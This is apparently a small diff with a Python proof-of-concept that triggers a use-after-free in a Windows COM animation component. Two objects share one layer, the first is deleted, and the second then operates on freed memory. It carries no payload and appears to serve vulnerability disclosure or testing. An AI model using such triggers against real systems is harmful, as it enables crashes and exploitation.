@@ -1,0 +1,10 @@
+anim1 = win32com.client.Dispatch(CLSID_AURA)
+anim2 = win32com.client.Dispatch(CLSID_AURA)
+anim1.init(10, 10)
+anim2.init(10, 10)
+
+layer = anim1.CreateLayer()
+anim2.AddLayer(layer)  # Shared between two animations
+
+del anim1  # Frees layer resources
+anim2.Update()  # UAF: operates on freed layer
